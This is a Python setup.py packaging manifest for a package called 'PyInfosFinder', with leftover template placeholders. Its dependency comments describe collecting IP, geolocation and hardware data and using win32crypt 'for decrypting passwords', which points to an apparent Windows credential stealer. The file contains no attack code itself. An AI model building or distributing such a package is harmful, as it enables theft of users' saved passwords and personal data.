from distutils.core import setup
setup(
  name = 'PyInfosFinder',         # How you named your package folder (MyLib)
  packages = ['PyInfosFinder'],   # Chose the same as "name"
  version = '0.1',      # Start with a small number and increase it with every change you make
  license='MIT',        # Chose a license from here: https://help.github.com/articles/licensing-a-repository
  description = 'IDK',   # Give a short description about your library
  author = 'BypassFDP',                   # Type in your name
  author_email = 'bypassfdp1501@gmail.com',      # Type in your E-Mail
  url = 'https://github.com/EuroMH/PyInfosRetriver',   # Provide either the link to your github or to your website
  download_url = 'https://github.com/EuroMH/PyInfosRetriver/releases/tag/1',    # I explain this later on
  keywords = ['SOME', 'MEANINGFULL', 'KEYWORDS'],   # Keywords that define your package best
  install_requires=[
    "requests",        # External: HTTP requests to fetch IP and geolocation
    "psutil",          # External: System and hardware information (CPU, RAM, disk, battery, etc.)
    "pycryptodome",    # External: Cryptographic algorithms (AES decryption)
    "pywin32"          # External: Windows-specific APIs (win32crypt for decrypting passwords)
],
  classifiers=[
    'Development Status :: 3 - Alpha',      # Chose either "3 - Alpha", "4 - Beta" or "5 - Production/Stable" as the current state of your package
    'Intended Audience :: Developers',      # Define that your audience are developers
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',   # Again, pick a license
    'Programming Language :: Python :: 3',      #Specify which pyhton versions that you want to support
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
  ],
)